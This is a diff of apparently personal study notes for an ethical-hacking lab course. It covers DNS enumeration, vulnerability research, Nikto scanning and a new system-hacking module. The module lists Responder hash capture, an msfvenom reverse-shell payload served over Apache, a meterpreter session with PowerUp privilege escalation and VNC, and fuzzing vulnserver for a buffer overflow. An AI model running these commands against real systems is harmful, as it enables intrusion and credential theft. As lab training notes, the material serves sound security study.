@@ -93,10 +93,10 @@
 #### Task 1: Gather DNS Information using nslookup Command Line Utility and Online Tool
 - ```cmd
   nslookup
-  set type=a
-  www.certifiedhacker.com
-  set type=cname
-  certifiedhacker.com
+  > set type=a
+  > www.certifiedhacker.com
+  > set type=cname
+  > certifiedhacker.com
   ```
 - http://www.kloth.net/services/nslookup.php
 - [DNSdumpster](https://dnsdumpster.com)
@@ -308,9 +308,9 @@
 - `dig @[[NameServer]] [[Target Domain]] axfr`
 - ```cmd
   nslookup
-  set querytype=soa
-  [Target Domain]`
-  ls -d [Name Server]
+  > set querytype=soa
+  > [Target Domain]`
+  > ls -d [Name Server]
   ```
 #### Task 2: Perform DNS Enumeration using DNSSEC Zone Walking
 - `./dnsrecon.py -d [Target domain] -z`
@@ -354,7 +354,6 @@
 ### Lab 1: Perform Vulnerability Research with Vulnerability Scoring Systems and Databases
 #### Task 1: Perform Vulnerability Research in Common Weakness Enumeration (CWE)
 - https://cwe.mitre.org/
-- CWE Top 25
 #### Task 2: Perform Vulnerability Research in Common Vulnerabilities and Exposures (CVE)
 - https://cve.mitre.org/
 #### Task 3: Perform Vulnerability Research in National Vulnerability Database (NVD)
@@ -368,3 +367,74 @@
 #### Task 3: Perform Web Servers and Applications Vulnerability Scanning using CGI Scanner Nikto
 - `nikto -h (Target Website) -Tuning x`
 - `nikto -h (Target Website) -Cgidirs all`
+
+
+
+## Module 06: System Hacking
+### Lab 1: Gain Access to the System
+#### Task 1: Perform Active Online Attack to Crack the System's Password using Responder
+- `sudo responder -I eth0`
+- `/usr/share/responder/logs`
+- `john hash.txt`
+#### Task 2: Audit System Passwords using L0phtCrack
+- `l0phtcrack`
+#### Task 3: Find Vulnerabilities on Exploit Sites
+- https://www.exploit-db.com/
+- [VulDB](https://vuldb.com)
+- [MITRE CVE](https://cve.mitre.org)
+- [Vulners](https://vulners.com)
+- [CIRCL CVE Search](https://cve.circl.lu)
+#### Task 4: Exploit Client-Side Vulnerabilities and Establish a VNC Session
+- `msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=[IP Address of Host Machine] LPORT=444 -o /home/attacker/Desktop/Test.exe`
+- ```sh
+  mkdir /var/www/html/share
+  chmod -R 755 /var/www/html/share
+  chown -R www-data:www-data /var/www/html/share
+  cp /home/attacker/Desktop/Test.exe /var/www/html/share
+  
+  service apache2 start
+  ```
+- ```sh
+  msfconsole
+  msf6 > use exploit/multi/handler
+  msf6 exploit(multi/handle) > set payload windows/meterpreter/reverse_tcp
+  msf6 exploit(multi/handle) > set LHOST 10.10.1.13
+  msf6 exploit(multi/handle) > set LPORT 444
+  msf6 exploit(multi/handle) > exploit
+  # can take meterpreter session if target download and execute Test.exe
+  meterpreter > sysinfo
+  meterpreter > upload /root/PowerSploit/Privesc/PowerUp.ps1 PowerUp.ps1
+  meterpreter > shell
+
+  C:\Users\Admin\Downloads>powershell -ExecutionPolicy Bypass -Command ". .\PowerUp.ps1;Invoke-AllChecks
+  C:\Users\Admin\Downloads>exit
+
+  meterpreter > run vnc
+  ```
+#### Task 5: Gain Access to a Remote System using Armitage
+- `service postgresql start`
+- `armitage`
+#### Task 6: Gain Access to a Remote System using Ninja Jonin
+- `Ninja Jonin`
+#### Task 7: Perform Buffer Overflow Attack to Gain Access to a Remote System
+- [vulnserver](https://github.com/stephenbradshaw/vulnserver)にバッファオーバーフローを介したRCE  
+  Immunity Debuggerでvulnserver.exeのプロセスをアタッチして監視
+- ```sh
+  # vulnserver にアクセス
+  nc -nv 10.10.1.11 9999
+  # HELPコマンドによりSTATコマンドやTRUNコマンドを確認
+  HELP
+  STATS [stat_value]
+  TRUN [trun_value]
+  ```
+  ```sh
+  # Fuziing、デバッガではRunnningであるため、どうやらSTATSコマンドは脆弱ではなさそう
+  echo 's_readline();\ns_string("STATS ");\ns_string_variable("0");' > stats.spk
+  generic_send_tcp 10.10.1.11 9999 stats.spk 0 0
+  
+  # Fuziing、デバッガがPausedであるため、TRUNコマンドにバッファオーバフローの脆弱性がありそう
+  echo 's_readline();\ns_string("TRUN ");\ns_string_variable("0");' > stats.spk
+  generic_send_tcp 10.10.1.11 9999 stats.spk 0 0
+  ```
+  https://github.com/FishyStix12/WHPython_v1.1/blob/main/fuzzywuzzy.py
+  `./fuzz.py`
